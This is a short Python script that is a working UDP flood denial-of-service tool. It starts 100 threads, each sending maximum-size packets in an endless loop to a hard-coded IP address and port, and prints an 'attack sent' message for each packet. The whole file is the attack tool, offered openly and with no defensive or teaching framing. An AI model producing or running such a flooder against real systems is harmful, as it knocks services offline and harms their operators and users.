import socket
import threading
from colorama import Fore, Style, init

init(autoreset=True)

def flood(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'A' * 65500, (target_ip, target_port))
            print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

if __name__ == "__main__":
    target_ip = "185.107.192.21"
    target_port = 51814

    threads = []
    for i in range(100):
        thread = threading.Thread(target=flood, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()